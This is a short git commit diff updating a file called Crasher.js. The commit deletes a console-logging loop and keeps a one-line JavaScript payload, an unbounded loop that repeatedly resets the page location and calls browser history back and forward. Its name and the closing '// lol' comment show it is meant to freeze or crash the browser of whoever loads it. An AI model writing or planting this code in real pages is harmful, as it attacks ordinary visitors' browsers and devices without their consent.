eb33e010ed9f00a8fc43338305a87cbc8f72d34d
bannywanny <100329389+bannywanny@users.noreply.github.com>
2023-08-19 17:26:23 -0500

    Update Crasher.js

--- Crasher.js
+++ Crasher.js
@@ -1,9 +1,3 @@
 for(let i=0;i<1/0;i++)document.location.href="#",window.history.back(),window.history.forward();
 
-let i = 0;
-do {
-  i += 1;
-  console.log("String");
-} while (i < 9e9);
-
 // lol
